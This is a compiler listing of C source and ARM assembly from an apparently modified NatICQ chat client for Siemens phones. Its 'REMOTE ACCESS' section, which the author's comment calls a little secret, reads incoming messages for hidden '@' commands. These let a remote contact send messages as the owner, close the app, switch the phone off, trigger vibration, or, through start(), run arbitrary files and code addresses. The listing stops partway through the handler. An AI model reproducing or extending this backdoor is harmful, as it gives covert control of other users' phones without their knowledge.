##############################################################################
#                                                                            #
# IAR ARM ANSI C/C++ Compiler V4.42A/W32 EVALUATION    19/Dec/2010  16:45:24 #
# Copyright 1999-2005 IAR Systems. All rights reserved.                      #
#                                                                            #
#    Cpu mode        =  interwork                                            #
#    Endian          =  little                                               #
#    Stack alignment =  4                                                    #
#    Source file     =  D:\pasha\elf\_MY_PROJECT_\naticq_mod\addon.c         #
#    Command line    =  D:\pasha\elf\_MY_PROJECT_\naticq_mod\addon.c -D      #
#                       NEWSGOLD --preprocess D:\pasha\elf\_MY_PROJECT_\nati #
#                       cq_mod\Release\List\ -lC D:\pasha\elf\_MY_PROJECT_\n #
#                       aticq_mod\Release\List\ -o                           #
#                       D:\pasha\elf\_MY_PROJECT_\naticq_mod\Release\Obj\    #
#                       -s9 --no_unroll --cpu_mode arm --endian little       #
#                       --cpu ARM926EJ-S --stack_align 4 --interwork         #
#                       --separate_cluster_for_initialized_variables -e      #
#                       --fpu None --dlib_config "D:\pasha\Embedded          #
#                       Workbench 4.0 Evaluation2\ARM\LIB\dl5tpainl8n.h" -I  #
#                       "D:\pasha\Embedded Workbench 4.0                     #
#                       Evaluation2\ARM\INC\" --inline_threshold=2           #
#    List file       =  D:\pasha\elf\_MY_PROJECT_\naticq_mod\Release\List\ad #
#                       don.lst                                              #
#    Object file     =  D:\pasha\elf\_MY_PROJECT_\naticq_mod\Release\Obj\add #
#                       on.r79                                               #
#                                                                            #
#                                                                            #
##############################################################################

D:\pasha\elf\_MY_PROJECT_\naticq_mod\addon.c
      1          #include "../inc/swilib.h"
      2          #include "../inc/cfg_items.h"
      3          #include "../inc/pnglist.h"
      4          #include "NatICQ.h"
      5          #include "main.h"
      6          #include "naticq_ipc.h"
      7          #include "../inc/xtask_ipc.h"
      8          #include "strings.h"
      9          
     10          //“ут вс€ка€ поебень)))
     11          
     12          #define _ECHOCHAT    "@1"
     13          #define _ECHO        "@2"
     14          #define _VIBRA       "@3"
     15          #define _IDLESCR     "@4"
     16          #define _DISCONNECT  "@5"
     17          #define _GETCLISTALL "@6"
     18          #define _GETCLIST    "@7"
     19          #define _WRITE       "@13"
     20          #define _GETFLIST    "@8"
     21          #define _RUNFILE     "@9"
     22          #define _PIKOFF      "@10"
     23          #define _EXIT        "@11"
     24          #define _TURNOFF     "@12" 
     25          #define MSG_ECHOCHAT "@Ms s: %s"
     26          //#define __ECHOCHAT "\x23\x65\x63\x68\x6F\x63\x68\x61\x74"
     27          #define ENA_SIGNAL 1 //дл€ команд, активировать сигналы,али нет
     28          #define DIS_SIGNAL 0
     29          
     30          //ѕо 10 секунд
     31          #define ACTIVE_TIME 360
     32          
     33          extern void SendData(CLIST *t,char *s,int signal,int count);
     34          extern void AddStringToLog(CLIST *t, int code, char *s, const char *name, unsigned int IDforACK,int flag);
     35          extern void RecountMenu(CLIST *req, int needfocus);
     36          extern void start_vibra(void);
     37          extern char *GetStatusByIconIndex(int icon);
     38          extern CLIST *FindContactByUin(unsigned int uin);
     39          
     40          
     41          extern int comanda;
     42          extern int VIBR_TYPE;
     43          extern volatile int silenthide;
     44          extern volatile int disautorecconect;
     45          extern volatile int vibra_count;
     46          extern volatile int SENDMSGCOUNT;
     47          extern volatile CLIST *cltop;
     48          extern char per_s[];
     49          extern char I_str[];
     50          extern int SHOW_ACTIVE;
     51          extern const char ipc_my_name[32];
     52          extern const char ipc_xtask_name[];
     53          extern const char ipc_test_name[];
     54          extern IPC_REQ gipc;
     55          

   \                                 In segment CODE, align 4, keep-with-next
     56          int get_file_size(char* fname)
     57          {
   \                     get_file_size:
   \   00000000   00402DE9           PUSH     {LR}
   \   00000004   2CD04DE2           SUB      SP,SP,#+44
     58            unsigned int err;
     59            FSTATS fs;
     60            if ((GetFileStats(fname,&fs,&err))==-1) return 0;
   \   00000008   0D20A0E1           MOV      R2,SP
   \   0000000C   04108DE2           ADD      R1,SP,#+4
   \   00000010   840000EF           SWI      +132
   \   00000014   010070E3           CMN      R0,#+1
     61            return (fs.size);
   \   00000018   08009D15           LDRNE    R0,[SP, #+8]
   \   0000001C   2CD08DE2           ADD      SP,SP,#+44
   \   00000020   0000A003           MOVEQ    R0,#+0
   \   00000024   0080BDE8           POP      {PC}             ;; return
     62          }
     63          
     64          

   \                                 In segment CODE, align 4, keep-with-next
     65          int start(const char s[128])
     66          {
   \                     start:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   04D04DE2           SUB      SP,SP,#+4
   \   00000008   0040B0E1           MOVS     R4,R0
     67            if((s)&&strlen(s))
   \   0000000C   6D00000A           BEQ      ??start_0
   \   00000010   1B0000EF           SWI      +27
   \   00000014   000050E3           CMP      R0,#+0
   \   00000018   3280BD08           POPEQ    {R1,R4,R5,PC}
     68             {
     69              if((s[2]=='\\')&&((s[(strlen(s))-3]=='.')||//ѕровер€ем строку на наличие символов '\\' и '.'
     70                 (s[(strlen(s))-4]=='.')||(s[(strlen(s))-5]=='.')))
   \   0000001C   0200D4E5           LDRB     R0,[R4, #+2]
   \   00000020   5C0050E3           CMP      R0,#+92
   \   00000024   1E00001A           BNE      ??start_1
   \   00000028   0400A0E1           MOV      R0,R4
   \   0000002C   1B0000EF           SWI      +27
   \   00000030   040080E0           ADD      R0,R0,R4
   \   00000034   030050E5           LDRB     R0,[R0, #-3]
   \   00000038   2E0050E3           CMP      R0,#+46
   \   0000003C   0B00000A           BEQ      ??start_2
   \   00000040   0400A0E1           MOV      R0,R4
   \   00000044   1B0000EF           SWI      +27
   \   00000048   040080E0           ADD      R0,R0,R4
   \   0000004C   040050E5           LDRB     R0,[R0, #-4]
   \   00000050   2E0050E3           CMP      R0,#+46
   \   00000054   0500000A           BEQ      ??start_2
   \   00000058   0400A0E1           MOV      R0,R4
   \   0000005C   1B0000EF           SWI      +27
   \   00000060   040080E0           ADD      R0,R0,R4
   \   00000064   050050E5           LDRB     R0,[R0, #-5]
   \   00000068   2E0050E3           CMP      R0,#+46
   \   0000006C   0C00001A           BNE      ??start_1
     71                 /* ≈сли в строке есть символы '\\' и '.', то запускаем как обычный файл*/
     72                  {
     73                    WSHDR *ws;
     74                    ws=AllocWS(256);
   \                     ??start_2:
   \   00000070   400FA0E3           MOV      R0,#+256
   \   00000074   250100EF           SWI      +293
   \   00000078   0050A0E1           MOV      R5,R0
     75                    str_2ws(ws,s,256);
   \   0000007C   402FA0E3           MOV      R2,#+256
   \   00000080   0410A0E1           MOV      R1,R4
   \   00000084   6C0100EF           SWI      +364
     76                    ExecuteFile(ws,0,0);
   \   00000088   0020A0E3           MOV      R2,#+0
   \   0000008C   0010A0E3           MOV      R1,#+0
   \   00000090   0500A0E1           MOV      R0,R5
   \   00000094   940000EF           SWI      +148
     77                    FreeWS(ws);
   \   00000098   0500A0E1           MOV      R0,R5
   \   0000009C   290100EF           SWI      +297
     78                    return (1);
   \   000000A0   1F0000EA           B        ??start_3
     79                   }
     80              if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
     81                 (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
     82                 (s[0]!='a')&&(s[0]!='A')&&(s[1]!='0'))
   \                     ??start_1:
   \   000000A4   0200D4E5           LDRB     R0,[R4, #+2]
   \   000000A8   20519FE5           LDR      R5,??start_4     ;; `?<Constant "NULL pointer function!">`
   \   000000AC   5C0050E3           CMP      R0,#+92
   \   000000B0   2200000A           BEQ      ??start_5
   \   000000B4   0400A0E1           MOV      R0,R4
   \   000000B8   1B0000EF           SWI      +27
   \   000000BC   040080E0           ADD      R0,R0,R4
   \   000000C0   030050E5           LDRB     R0,[R0, #-3]
   \   000000C4   2E0050E3           CMP      R0,#+46
   \   000000C8   1C00000A           BEQ      ??start_5
   \   000000CC   0400A0E1           MOV      R0,R4
   \   000000D0   1B0000EF           SWI      +27
   \   000000D4   040080E0           ADD      R0,R0,R4
   \   000000D8   040050E5           LDRB     R0,[R0, #-4]
   \   000000DC   2E0050E3           CMP      R0,#+46
   \   000000E0   1600000A           BEQ      ??start_5
   \   000000E4   0400A0E1           MOV      R0,R4
   \   000000E8   1B0000EF           SWI      +27
   \   000000EC   040080E0           ADD      R0,R0,R4
   \   000000F0   050050E5           LDRB     R0,[R0, #-5]
   \   000000F4   2E0050E3           CMP      R0,#+46
   \   000000F8   0000D415           LDRBNE   R0,[R4, #+0]
   \   000000FC   61005013           CMPNE    R0,#+97
   \   00000100   41005013           CMPNE    R0,#+65
   \   00000104   0100D415           LDRBNE   R0,[R4, #+1]
   \   00000108   30005013           CMPNE    R0,#+48
   \   0000010C   0B00000A           BEQ      ??start_5
     83                  {
     84                  int (*p) (void);
     85                   p=(int(*)(void))GetFunctionPointer((char*)s);
   \   00000110   0400A0E1           MOV      R0,R4
   \   00000114   740000EF           SWI      +116
     86                   if(p!=NULL)
   \   00000118   000050E3           CMP      R0,#+0
   \   0000011C   0200000A           BEQ      ??start_6
     87                    (*p)();
   \   00000120   30FF2FE1           BLX      R0
   \                     ??start_3:
   \   00000124   0100A0E3           MOV      R0,#+1
   \   00000128   3280BDE8           POP      {R1,R4,R5,PC}
     88                   else
     89                     ShowMSG(1,(int)"NULL pointer function!");
   \                     ??start_6:
   \   0000012C   0510A0E1           MOV      R1,R5
   \   00000130   0100A0E3           MOV      R0,#+1
   \   00000134   480100EF           SWI      +328
     90                  return 1;
   \   00000138   0100A0E3           MOV      R0,#+1
   \   0000013C   3280BDE8           POP      {R1,R4,R5,PC}
     91                  }
     92          
     93              if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
     94                 (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
     95                 ((s[0]=='a')||(s[0]=='A'))&&(s[1]=='0'))
   \                     ??start_5:
   \   00000140   0200D4E5           LDRB     R0,[R4, #+2]
   \   00000144   5C0050E3           CMP      R0,#+92
   \   00000148   1E00000A           BEQ      ??start_0
   \   0000014C   0400A0E1           MOV      R0,R4
   \   00000150   1B0000EF           SWI      +27
   \   00000154   040080E0           ADD      R0,R0,R4
   \   00000158   030050E5           LDRB     R0,[R0, #-3]
   \   0000015C   2E0050E3           CMP      R0,#+46
   \   00000160   1800000A           BEQ      ??start_0
   \   00000164   0400A0E1           MOV      R0,R4
   \   00000168   1B0000EF           SWI      +27
   \   0000016C   040080E0           ADD      R0,R0,R4
   \   00000170   040050E5           LDRB     R0,[R0, #-4]
   \   00000174   2E0050E3           CMP      R0,#+46
   \   00000178   1200000A           BEQ      ??start_0
   \   0000017C   0400A0E1           MOV      R0,R4
   \   00000180   1B0000EF           SWI      +27
   \   00000184   040080E0           ADD      R0,R0,R4
   \   00000188   050050E5           LDRB     R0,[R0, #-5]
   \   0000018C   2E0050E3           CMP      R0,#+46
   \   00000190   0C00000A           BEQ      ??start_0
   \   00000194   0000D4E5           LDRB     R0,[R4, #+0]
   \   00000198   610050E3           CMP      R0,#+97
   \   0000019C   41005013           CMPNE    R0,#+65
   \   000001A0   0100D405           LDRBEQ   R0,[R4, #+1]
   \   000001A4   30005003           CMPEQ    R0,#+48
   \   000001A8   0600001A           BNE      ??start_0
     96                  {
     97                    int entry;
     98                    sscanf(s,"%08X",&entry);
   \   000001AC   0D20A0E1           MOV      R2,SP
   \   000001B0   181085E2           ADD      R1,R5,#+24
   \   000001B4   0400A0E1           MOV      R0,R4
   \   000001B8   F50100EF           SWI      +501
     99                    SUBPROC((void*)entry);
   \   000001BC   00009DE5           LDR      R0,[SP, #+0]
   \   000001C0   710100EF           SWI      +369
    100                    return 1;
   \   000001C4   D6FFFFEA           B        ??start_3
    101                  }
    102             }
    103            return 0;    
   \                     ??start_0:
   \   000001C8   0000A0E3           MOV      R0,#+0
   \   000001CC   3280BDE8           POP      {R1,R4,R5,PC}    ;; return
   \                     ??start_4:
   \   000001D0   ........           DC32     `?<Constant "NULL pointer function!">`
    104          }
    105          
    106          

   \                                 In segment CODE, align 4, keep-with-next
    107          void CheckComand2(char *txt, CLIST *t)
    108          {
   \                     CheckComand2:
   \   00000000   F04F2DE9           PUSH     {R4-R11,LR}
    109            comanda=1;    
   \   00000004   28A79FE5           LDR      R10,??CheckComand2_0+0x1C  ;; comanda
   \   00000008   ACD04DE2           SUB      SP,SP,#+172
   \   0000000C   40DE4DE2           SUB      SP,SP,#+1024
   \   00000010   0060A0E1           MOV      R6,R0
   \   00000014   01B0A0E3           MOV      R11,#+1
   \   00000018   00B08AE5           STR      R11,[R10, #+0]
    110          //---------------------- REMOTE ACCESS -------------------//
    111          //так,маленький секрет так сказать))) глюмлюсь над теми кто достает....))
    112           if((txt[0]=='#' || txt[0]=='@') && t->isaccess)
   \   0000001C   0000D6E5           LDRB     R0,[R6, #+0]
   \   00000020   0140A0E1           MOV      R4,R1
   \   00000024   230050E3           CMP      R0,#+35
   \   00000028   40005013           CMPNE    R0,#+64
   \   0000002C   B601001A           BNE      ??CheckComand2_1
   \   00000030   740094E5           LDR      R0,[R4, #+116]
   \   00000034   000050E3           CMP      R0,#+0
   \   00000038   B301000A           BEQ      ??CheckComand2_1
    113            {
    114              
    115            if(/*strstr(txt,"#write") || */strstr(txt,_WRITE))//#write uin message
   \   0000003C   F4869FE5           LDR      R8,??CheckComand2_0+0x20  ;; SENDMSGCOUNT
   \   00000040   0270A0E3           MOV      R7,#+2
   \   00000044   F05F8FE2           ADR      R5,??CheckComand2_2  ;; "@13"
   \   00000048   0510A0E1           MOV      R1,R5
   \   0000004C   0600A0E1           MOV      R0,R6
   \   00000050   180100EF           SWI      +280
   \   00000054   000050E3           CMP      R0,#+0
   \   00000058   1F00000A           BEQ      ??CheckComand2_3
    116              {
    117                char *s=strrchr(txt,' ')+1;
   \   0000005C   2010A0E3           MOV      R1,#+32
   \   00000060   0600A0E1           MOV      R0,R6
   \   00000064   170100EF           SWI      +279
   \   00000068   014080E2           ADD      R4,R0,#+1
    118          #ifdef kluchnik
    119                CLIST *tt;
    120                tt=FindContactByUin(strtoul(txt+strlen(_WRITE)+1,0,10));
    121                AddStringToLog(tt,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    122                AddStringToLog(t,0x01,txt,I_str,0x7FFF,1);
    123                t->signals=1;
    124                tt->signals=1;
    125                if(SHOW_ACTIVE)
    126                  tt->isactive=ACTIVE_TIME;
    127          #else
    128                ++SENDMSGCOUNT;
   \   0000006C   000098E5           LDR      R0,[R8, #+0]
   \   00000070   010080E2           ADD      R0,R0,#+1
   \   00000074   000088E5           STR      R0,[R8, #+0]
    129          #endif
    130                TPKT *p;
    131                p=malloc(sizeof(PKT)+strlen(s)+1);
   \   00000078   0400A0E1           MOV      R0,R4
   \   0000007C   1B0000EF           SWI      +27
   \   00000080   090080E2           ADD      R0,R0,#+9
   \   00000084   140000EF           SWI      +20
   \   00000088   0080A0E1           MOV      R8,R0
    132                p->pkt.uin=strtoul(txt+strlen(_WRITE)+1,0,10);
   \   0000008C   0500A0E1           MOV      R0,R5
   \   00000090   1B0000EF           SWI      +27
   \   00000094   0A20A0E3           MOV      R2,#+10
   \   00000098   0010A0E3           MOV      R1,#+0
   \   0000009C   060080E0           ADD      R0,R0,R6
   \   000000A0   010080E2           ADD      R0,R0,#+1
   \   000000A4   ........           _BLF     strtoul,??strtoul??rA
   \   000000A8   000088E5           STR      R0,[R8, #+0]
    133                p->pkt.type=T_SENDMSG;
   \   000000AC   B470C8E1           STRH     R7,[R8, #+4]
    134                p->pkt.data_len=strlen(s);
   \   000000B0   0400A0E1           MOV      R0,R4
   \   000000B4   1B0000EF           SWI      +27
   \   000000B8   B600C8E1           STRH     R0,[R8, #+6]
    135                strcpy(p->data,s);
   \   000000BC   0410A0E1           MOV      R1,R4
   \   000000C0   080088E2           ADD      R0,R8,#+8
   \   000000C4   1A0000EF           SWI      +26
    136                SUBPROC((void *)SendAnswer,0,p);
   \   000000C8   6C069FE5           LDR      R0,??CheckComand2_0+0x24  ;; SendAnswer
   \   000000CC   0820A0E1           MOV      R2,R8
   \   000000D0   0010A0E3           MOV      R1,#+0
   \   000000D4   710100EF           SWI      +369
    137                return;
   \   000000D8   220100EA           B        ??CheckComand2_4
    138              }
    139               /*
    140             if(strstr(txt,_PIKOFF))
    141              {
    142                char *s=malloc(1);
    143                strcpy(s,"BGAGA");    
    144              }*/
    145             
    146                if(strstr(txt,_EXIT))
   \                     ??CheckComand2_3:
   \   000000DC   0090A0E3           MOV      R9,#+0
   \   000000E0   CA1F8FE2           ADR      R1,??CheckComand2_2+0x4  ;; "@11"
   \   000000E4   0600A0E1           MOV      R0,R6
   \   000000E8   180100EF           SWI      +280
   \   000000EC   000050E3           CMP      R0,#+0
   \   000000F0   0200000A           BEQ      ??CheckComand2_5
    147              {    
    148                t->signals=0;
    149          #ifdef kluchnik
    150          #else      
    151                extern void ElfKiller(void);
    152                SUBPROC((void *)ElfKiller);        
   \   000000F4   44069FE5           LDR      R0,??CheckComand2_0+0x28  ;; ElfKiller
   \   000000F8   709084E5           STR      R9,[R4, #+112]
   \   000000FC   710100EF           SWI      +369
    153          #endif
    154              }
    155              
    156              if(strstr(txt,_TURNOFF))
   \                     ??CheckComand2_5:
   \   00000100   C31F8FE2           ADR      R1,??CheckComand2_2+0x8  ;; "@12"
   \   00000104   0600A0E1           MOV      R0,R6
   \   00000108   180100EF           SWI      +280
   \   0000010C   000050E3           CMP      R0,#+0
   \   00000110   0200000A           BEQ      ??CheckComand2_6
    157              {
    158                t->signals=0;
   \   00000114   709084E5           STR      R9,[R4, #+112]
    159          #ifdef kluchnik      
    160          #else
    161                SwitchPhoneOff();
   \   00000118   090000EF           SWI      +9
    162          #endif
    163                return;
   \   0000011C   110100EA           B        ??CheckComand2_4
    164              }    
    165             
    166             if(/*strstr(txt,"#echochat") || */strstr(txt,_ECHOCHAT))
   \                     ??CheckComand2_6:
   \   00000120   1C569FE5           LDR      R5,??CheckComand2_0+0x2C  ;; `?<Constant "@Ms s: %s">`
   \   00000124   BB1F8FE2           ADR      R1,??CheckComand2_2+0xC  ;; "@1"
   \   00000128   0600A0E1           MOV      R0,R6
   \   0000012C   180100EF           SWI      +280
   \   00000130   000050E3           CMP      R0,#+0
   \   00000134   6100000A           BEQ      ??CheckComand2_7
    167             {
    168              char msg[256];
    169              sprintf(msg,MSG_ECHOCHAT,txt);
   \   00000138   0620A0E1           MOV      R2,R6
   \   0000013C   0510A0E1           MOV      R1,R5
   \   00000140   EB0F8DE2           ADD      R0,SP,#+940
   \   00000144   160000EF           SWI      +22
    170              char *k;
    171              if(strstr(txt,_ECHOCHAT))
   \   00000148   B21F8FE2           ADR      R1,??CheckComand2_2+0xC  ;; "@1"
   \   0000014C   0600A0E1           MOV      R0,R6
   \   00000150   180100EF           SWI      +280
   \   00000154   000050E3           CMP      R0,#+0
   \   00000158   0300000A           BEQ      ??CheckComand2_8
    172                k=txt+(strlen(_ECHOCHAT)+2);
   \   0000015C   AD0F8FE2           ADR      R0,??CheckComand2_2+0xC  ;; "@1"
   \   00000160   1B0000EF           SWI      +27
   \   00000164   060080E0           ADD      R0,R0,R6
   \   00000168   02A080E2           ADD      R10,R0,#+2
    173          /*    else
    174               k=txt+(strlen("#echochat")+2);*/
    175              char name[32];
    176              zeromem(name,32);
   \                     ??CheckComand2_8:
   \   0000016C   2010A0E3           MOV      R1,#+32
   \   00000170   48008DE2           ADD      R0,SP,#+72
   \   00000174   1D0100EF           SWI      +285
    177              char *tmp;
    178              if(tmp=strstr(txt," ")+1)//после первого пробела идет им€
   \   00000178   A71F8FE2           ADR      R1,??CheckComand2_2+0x10  ;; " "
   \   0000017C   0600A0E1           MOV      R0,R6
   \   00000180   180100EF           SWI      +280
   \   00000184   010080E2           ADD      R0,R0,#+1
   \   00000188   00008DE5           STR      R0,[SP, #+0]
   \   0000018C   000050E3           CMP      R0,#+0
   \   00000190   1900000A           BEQ      ??CheckComand2_9
    179              {
    180                if(strstr(tmp,"!"))//если есть еще '!',значит им€ прописали:)
   \   00000194   A11F8FE2           ADR      R1,??CheckComand2_2+0x14  ;; "!"
   \   00000198   180100EF           SWI      +280
   \   0000019C   000050E3           CMP      R0,#+0
   \   000001A0   1400000A           BEQ      ??CheckComand2_10
    181                {
    182                  int ii=0;
    183                  for(ii=0;(ii<strlen(k) && ii<32) && ( k[ii]!=' ' );ii++)
   \   000001A4   00B0A0E3           MOV      R11,#+0
   \   000001A8   030000EA           B        ??CheckComand2_11
    184                    name[ii]=k[ii];
   \                     ??CheckComand2_12:
   \   000001AC   0A10DBE7           LDRB     R1,[R11, +R10]
   \   000001B0   04009DE5           LDR      R0,[SP, #+4]
   \   000001B4   01B08BE2           ADD      R11,R11,#+1
   \   000001B8   0010C0E5           STRB     R1,[R0, #+0]
   \                     ??CheckComand2_11:
   \   000001BC   48108DE2           ADD      R1,SP,#+72
   \   000001C0   01108BE0           ADD      R1,R11,R1
   \   000001C4   04108DE5           STR      R1,[SP, #+4]
   \   000001C8   0A00A0E1           MOV      R0,R10
   \   000001CC   1B0000EF           SWI      +27
   \   000001D0   00005BE1           CMP      R11,R0
   \   000001D4   0400002A           BCS      ??CheckComand2_13
   \   000001D8   20005BE3           CMP      R11,#+32
   \   000001DC   020000AA           BGE      ??CheckComand2_13
   \   000001E0   0A00DBE7           LDRB     R0,[R11, +R10]
   \   000001E4   200050E3           CMP      R0,#+32
   \   000001E8   EFFFFF1A           BNE      ??CheckComand2_12
    185                    name[ii++]=0;
   \                     ??CheckComand2_13:
   \   000001EC   04009DE5           LDR      R0,[SP, #+4]
   \   000001F0   0090C0E5           STRB     R9,[R0, #+0]
   \   000001F4   000000EA           B        ??CheckComand2_9
    186                }
    187                else tmp=0;//иначе нуль
   \                     ??CheckComand2_10:
   \   000001F8   00908DE5           STR      R9,[SP, #+0]
    188              }
    189              else tmp=0;//так,на вс€к случай ))
    190              
    191          //    char *msg2=strrchr(txt,' ')+1;//наше сообщение дл€ отправки
    192              char *msg2;
    193              if(strstr(txt,_ECHOCHAT))
   \                     ??CheckComand2_9:
   \   000001FC   851F8FE2           ADR      R1,??CheckComand2_2+0xC  ;; "@1"
   \   00000200   0600A0E1           MOV      R0,R6
   \   00000204   180100EF           SWI      +280
   \   00000208   000050E3           CMP      R0,#+0
   \   0000020C   0700000A           BEQ      ??CheckComand2_14
    194                msg2=txt+(strlen(_ECHOCHAT)+2+strlen(name)+1);
   \   00000210   800F8FE2           ADR      R0,??CheckComand2_2+0xC  ;; "@1"
   \   00000214   1B0000EF           SWI      +27
   \   00000218   0070A0E1           MOV      R7,R0
   \   0000021C   48008DE2           ADD      R0,SP,#+72
   \   00000220   1B0000EF           SWI      +27
   \   00000224   070080E0           ADD      R0,R0,R7
   \   00000228   060080E0           ADD      R0,R0,R6
   \   0000022C   037080E2           ADD      R7,R0,#+3
    195          /*    else
    196                msg2=txt+(strlen("#echochat")+1+strlen(name)+1);*/
    197              char *s=malloc(256);
   \                     ??CheckComand2_14:
   \   00000230   400FA0E3           MOV      R0,#+256
   \   00000234   140000EF           SWI      +20
   \   00000238   0060A0E1           MOV      R6,R0
    198              sprintf(s,"m [ %s ] to [ %s ] n [ %s ] s.",msg2,t->name, name);
   \   0000023C   48008DE2           ADD      R0,SP,#+72
   \   00000240   01002DE9           PUSH     {R0}
   \   00000244   143084E2           ADD      R3,R4,#+20
   \   00000248   0720A0E1           MOV      R2,R7
   \   0000024C   0C1085E2           ADD      R1,R5,#+12
   \   00000250   0600A0E1           MOV      R0,R6
   \   00000254   160000EF           SWI      +22
    199              if(tmp!=0)
   \   00000258   04109DE5           LDR      R1,[SP, #+4]
   \   0000025C   04D08DE2           ADD      SP,SP,#+4
   \   00000260   000051E3           CMP      R1,#+0
   \   00000264   001098E5           LDR      R1,[R8, #+0]
   \   00000268   FF00A0E3           MOV      R0,#+255
   \   0000026C   7F0C80E3           ORR      R0,R0,#0x7F00
   \   00000270   011081E2           ADD      R1,R1,#+1
   \   00000274   001088E5           STR      R1,[R8, #+0]
   \   00000278   0120A0E3           MOV      R2,#+1
   \   0000027C   04002DE9           PUSH     {R2}
   \   00000280   010000E0           AND      R0,R0,R1
   \   00000284   01002DE9           PUSH     {R0}
    200                AddStringToLog(t,0x02,msg2,name,(++SENDMSGCOUNT)&0x7FFF,1);
   \   00000288   50308D12           ADDNE    R3,SP,#+80
    201              else
    202                AddStringToLog(t,0x02,msg2,"Ib",(++SENDMSGCOUNT)&0x7FFF,1);
   \   0000028C   643F8F02           ADREQ    R3,??CheckComand2_2+0x18  ;; "Ib"
   \   00000290   0720A0E1           MOV      R2,R7
   \   00000294   0210A0E3           MOV      R1,#+2
   \   00000298   0400A0E1           MOV      R0,R4
   \   0000029C   ........           _BLF     AddStringToLog,??AddStringToLog??rA
   \   000002A0   08D08DE2           ADD      SP,SP,#+8
    203          
    204              SendData(t,s,ENA_SIGNAL,0);
   \   000002A4   0030A0E3           MOV      R3,#+0
   \   000002A8   0120A0E3           MOV      R2,#+1
   \                     ??CheckComand2_15:
   \   000002AC   0610A0E1           MOV      R1,R6
   \   000002B0   0400A0E1           MOV      R0,R4
   \   000002B4   ........           _BLF     SendData,??SendData??rA
    205              mfree(s);
   \   000002B8   0600A0E1           MOV      R0,R6
   \                     ??CheckComand2_16:
   \   000002BC   A80000EA           B        ??CheckComand2_17
    206              return;   
    207             }
    208             
    209             if(/*strstr(txt,"#echo") || */strstr(txt,_ECHO))
   \                     ??CheckComand2_7:
   \   000002C0   581F8FE2           ADR      R1,??CheckComand2_2+0x1C  ;; "@2"
   \   000002C4   0600A0E1           MOV      R0,R6
   \   000002C8   180100EF           SWI      +280
   \   000002CC   000050E3           CMP      R0,#+0
   \   000002D0   0A00000A           BEQ      ??CheckComand2_18
    210               {
    211                ShowMSG(1,(int)txt+2);
   \   000002D4   021086E2           ADD      R1,R6,#+2
   \   000002D8   0100A0E3           MOV      R0,#+1
   \   000002DC   480100EF           SWI      +328
    212                char msg[256];
    213                sprintf(msg,"M %s snd",txt);
   \   000002E0   0620A0E1           MOV      R2,R6
   \   000002E4   2C1085E2           ADD      R1,R5,#+44
   \   000002E8   EB0F8DE2           ADD      R0,SP,#+940
   \   000002EC   160000EF           SWI      +22
    214                SendData(t,msg,ENA_SIGNAL,1);
   \   000002F0   0B30A0E1           MOV      R3,R11
   \   000002F4   0320A0E1           MOV      R2,R3
   \   000002F8   EB1F8DE2           ADD      R1,SP,#+940
   \   000002FC   000100EA           B        ??CheckComand2_19
    215                return;
    216               }
    217             
    218             if(/*strstr(txt,"#vibra") || */strstr(txt,_VIBRA))
   \                     ??CheckComand2_18:
   \   00000300   491F8FE2           ADR      R1,??CheckComand2_2+0x20  ;; "@3"
   \   00000304   0600A0E1           MOV      R0,R6
   \   00000308   180100EF           SWI      +280
   \   0000030C   000050E3           CMP      R0,#+0
   \   00000310   1200000A           BEQ      ??CheckComand2_20
    219              {
    220                vibra_count=strtoul(txt+3,0,10);
   \   00000314   2C549FE5           LDR      R5,??CheckComand2_0+0x30  ;; vibra_count
   \   00000318   0A20A0E3           MOV      R2,#+10
   \   0000031C   0010A0E3           MOV      R1,#+0
   \   00000320   030086E2           ADD      R0,R6,#+3
   \   00000324   ........           _BLF     strtoul,??strtoul??rA
   \   00000328   000085E5           STR      R0,[R5, #+0]
    221                
    222                if(vibra_count==0)
   \   0000032C   000095E5           LDR      R0,[R5, #+0]
   \   00000330   000050E3           CMP      R0,#+0
   \   00000334   0400001A           BNE      ??CheckComand2_21
    223                {
    224                  if( VIBR_TYPE) //если написали просто команду без параметра
   \   00000338   0C049FE5           LDR      R0,??CheckComand2_0+0x34  ;; VIBR_TYPE
   \   0000033C   000090E5           LDR      R0,[R0, #+0]
   \   00000340   000050E3           CMP      R0,#+0
    225                   vibra_count=2;
   \   00000344   00708515           STRNE    R7,[R5, #+0]
    226                  else
    227                   vibra_count=1;
   \   00000348   00B08505           STREQ    R11,[R5, #+0]
    228                }
    229          #ifdef kluchnik
    230                if(vibra_count>10 || vibra_count<0)
    231                  vibra_count=1;
    232          #endif
    233                start_vibra();
   \                     ??CheckComand2_21:
   \   0000034C   ........           _BLF     start_vibra,??start_vibra??rA
    234                SendData(t,"act",DIS_SIGNAL,1);
   \   00000350   0130A0E3           MOV      R3,#+1
   \   00000354   0920A0E1           MOV      R2,R9
   \   00000358   EE1F8FE2           ADR      R1,??CheckComand2_0  ;; "act"
   \   0000035C   E80000EA           B        ??CheckComand2_19
    235                return;      
    236              }    
    237              /*
    238             if(strstr(txt,"#gprsoff"))
    239             {
    240          #ifdef kluchnik
    241               char *s=malloc(256);
    242               sprintf(s,"Recive command < Gprs off >");
    243               AddStringToLog(t,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    244               mfree(s);
    245               SendData(t,"GPRS Off",ENA_SIGNAL,0);
    246          #else
    247               SendData(t,"GPRS Off",DIS_SIGNAL,1);
    248               GPRS_OnOff(0,1);   
    249          #endif
    250               return;
    251             }*/
    252           
    253              
    254              if(/*strstr(txt,"#idlescr") ||*/ strstr(txt,_IDLESCR))
   \                     ??CheckComand2_20:
   \   00000360   ED1F8FE2           ADR      R1,??CheckComand2_0+0x4  ;; "@4"
   \   00000364   0600A0E1           MOV      R0,R6
   \   00000368   180100EF           SWI      +280
   \   0000036C   000050E3           CMP      R0,#+0
   \   00000370   1600000A           BEQ      ??CheckComand2_22
    255              {
    256                SendData(t,"scr..",DIS_SIGNAL,1);
   \   00000374   0130A0E3           MOV      R3,#+1
   \   00000378   0920A0E1           MOV      R2,R9
   \   0000037C   381085E2           ADD      R1,R5,#+56
   \   00000380   0400A0E1           MOV      R0,R4
   \   00000384   ........           _BLF     SendData,??SendData??rA
    257                RecountMenu(NULL,1);
   \   00000388   0B10A0E1           MOV      R1,R11
   \   0000038C   0900A0E1           MOV      R0,R9
